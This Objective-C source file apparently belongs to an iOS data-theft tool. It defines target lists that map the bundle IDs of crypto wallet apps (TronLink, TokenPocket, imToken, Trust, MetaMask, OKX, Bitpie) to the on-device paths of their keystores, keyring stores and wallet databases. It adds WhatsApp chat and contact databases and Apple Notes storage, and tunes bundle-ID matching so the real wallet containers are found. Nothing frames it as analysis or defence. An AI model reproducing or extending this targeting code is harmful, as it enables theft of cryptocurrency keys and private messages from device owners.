#import "WQLTargets.h"
#import <dispatch/dispatch.h>

@interface WQLTargets ()
+ (BOOL)isNoiseBundleID:(NSString *)lower;
+ (BOOL)fuzzyHit:(NSString *)lower token:(NSString *)token;
@end

@implementation WQLTarget

- (BOOL)matchesBundleID:(NSString *)bundleID {
    if (!bundleID.length) return NO;
    NSString *lower = bundleID.lowercaseString;

    for (NSString *bid in self.bundleIDs) {
        if ([bid.lowercaseString isEqualToString:lower]) return YES;
    }
    for (NSString *f in self.fuzzyIDs) {
        if ([lower containsString:f.lowercaseString]) return YES;
    }
    return NO;
}

@end

@implementation WQLTargets

+ (WQLTarget *)target:(NSString *)name
            bundleIDs:(NSArray<NSString *> *)ids
             fuzzyIDs:(NSArray<NSString *> *)fuzzy
                paths:(NSArray<NSString *> *)paths
       wholeContainer:(BOOL)whole {
    WQLTarget *t = [WQLTarget new];
    t.name = name;
    t.bundleIDs = ids;
    t.fuzzyIDs = fuzzy;
    t.relativePaths = paths;
    t.wholeContainer = whole;
    return t;
}

+ (NSArray<WQLTarget *> *)wallets {
    return @[
        [self target:@"TronLink"
           bundleIDs:@[@"com.tronlink.hdwallet", @"com.tronlink.wallet"]
            fuzzyIDs:@[@"tronlink"]
               paths:@[@"Documents/TronLinkData.sqlite", @"Documents/keystore"]
      wholeContainer:NO],

        [self target:@"TokenPocket"
           bundleIDs:@[@"vip.mytokenpocket", @"pro.tokenpocket.tp",
                       @"com.tokenpocket.ios", @"com.global.wallet.ios"]
            fuzzyIDs:@[@"tokenpocket", @"mytokenpocket"]
               paths:@[@"Documents/db/main.sqlite3", @"Documents/F4SeCyr", @"Documents/walletsV2"]
      wholeContainer:NO],

        [self target:@"imToken"
           bundleIDs:@[@"im.token.app", @"im.token", @"imtoken"]
            fuzzyIDs:@[@"im.token", @"imtoken"]
               paths:@[@"Library/Application Support/im.token.app"]
      wholeContainer:NO],

        [self target:@"Trust"
           bundleIDs:@[@"com.sixdays.trust", @"com.wallet.crypto.trustapp"]
            fuzzyIDs:@[@"sixdays.trust", @"trustapp", @"trust.wallet"]
               paths:@[@"Documents/temp-cloud-keystore",
                       @"Library/Preferences/com.sixdays.trust.plist"]
      wholeContainer:NO],

        [self target:@"MetaMask"
           bundleIDs:@[@"io.metamask.MetaMask"]
            fuzzyIDs:@[@"metamask"]
               paths:@[@"Documents/persistStore/persist-KeyringController",
                       @"Documents/persistStore/persist-AccountsController"]
      wholeContainer:NO],

        [self target:@"OKX"
           bundleIDs:@[@"com.okex.OKExAppstoreFull", @"com.okex.okexwallet", @"com.okex.okex",
                       @"com.okex.wallet", @"com.okx.okx", @"com.okx.wallet", @"com.okx.app",
                       @"com.okinc.okex", @"com.okcoin.okex", @"com.okcoin.app", @"org.okx.ios"]
            fuzzyIDs:@[@"okx", @"okex", @"okcoin", @"okinc"]
               paths:@[@"Documents/wallet"]
      wholeContainer:NO],

        [self target:@"Bitpie"
           bundleIDs:@[@"com.bitpie.wallet"]
            fuzzyIDs:@[@"bitpie"]
               paths:@[@"Library/Preferences/com.bitpie.wallet.plist"]
      wholeContainer:YES],
    ];
}

+ (NSArray<WQLTarget *> *)extras {
    return @[
        [self target:@"WhatsApp"
           bundleIDs:@[@"net.whatsapp.WhatsApp", @"net.whatsapp.WhatsAppSMB"]
            fuzzyIDs:@[]
               paths:@[@"Documents/ChatStorage.sqlite", @"Documents/ContactsV2.sqlite"]
      wholeContainer:NO],

        [self target:@"Notes"
           bundleIDs:@[@"group.com.apple.notes"]
            fuzzyIDs:@[@"group.com.apple.notes"]
               paths:@[@"NoteStore.sqlite"]
      wholeContainer:NO],
    ];
}

+ (WQLTarget *)matchBundleID:(NSString *)bundleID inTargets:(NSArray<WQLTarget *> *)targets {
    return [self matchBundleID:bundleID inTargets:targets fuzzy:NULL];
}

+ (WQLTarget *)matchBundleID:(NSString *)bundleID
                   inTargets:(NSArray<WQLTarget *> *)targets
                       fuzzy:(BOOL *)fuzzy {
    if (fuzzy) *fuzzy = NO;
    if (!bundleID.length) return nil;

    NSString *lower = bundleID.lowercaseString;

    // 先精确匹配，命中就不算模糊（精确表里的项不做噪音过滤，例如 group.com.apple.notes）
    for (WQLTarget *t in targets) {
        for (NSString *bid in t.bundleIDs) {
            if ([bid.lowercaseString isEqualToString:lower]) return t;
        }
    }

    // 以下都是模糊匹配，必须先排除噪音容器，否则 okex 会命中 QuickLookExtension 里的 "lookEx"
    if ([WQLTargets isNoiseBundleID:lower]) return nil;
    // 再模糊：必须落在 bundle 段边界上（前后是 . 或首尾），避免 "lookEx" 这种半段命中
    for (WQLTarget *t in targets) {
        for (NSString *f in t.fuzzyIDs) {
            if ([WQLTargets fuzzyHit:lower token:f.lowercaseString]) {
                if (fuzzy) *fuzzy = YES;
                return t;
            }
        }
    }
    return nil;
}

#pragma mark - 噪音过滤

/// 扩展 / Widget / 共享组容器都不是钱包本体，模糊匹配阶段一律不要。
+ (BOOL)isNoiseBundleID:(NSString *)lower {
    if ([lower hasPrefix:@"com.apple."]) return YES;   // 苹果系统容器
    if ([lower hasPrefix:@"group."]) return YES;       // 共享组：只放配置/缓存，非钱包本体

    static NSArray<NSString *> *tokens = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        tokens = @[@"extension", @"widget", @"quicklook", @"notification",
                   @"uiext", @"shareext", @"keyboard", @"sticker",
                   @"spotlight", @"siri", @"shortcut", @"watch"];
    });
    for (NSString *t in tokens) {
        if ([lower containsString:t]) return YES;
    }
    return NO;
}

/// token 在 lower 中的某次出现，必须前后都是 '.' 或字符串首尾。
+ (BOOL)fuzzyHit:(NSString *)lower token:(NSString *)token {
    if (!token.length) return NO;
    NSRange search = NSMakeRange(0, lower.length);
    while (search.length) {
        NSRange r = [lower rangeOfString:token options:0 range:search];
        if (r.location == NSNotFound) return NO;
        BOOL leftOK = (r.location == 0) ||
                      ([lower characterAtIndex:r.location - 1] == '.');
        NSUInteger end = NSMaxRange(r);
        BOOL rightOK = (end == lower.length) ||
                       ([lower characterAtIndex:end] == '.');
        if (leftOK && rightOK) return YES;
        if (end >= lower.length) return NO;
        search = NSMakeRange(end, lower.length - end);
    }
    return NO;
}

@end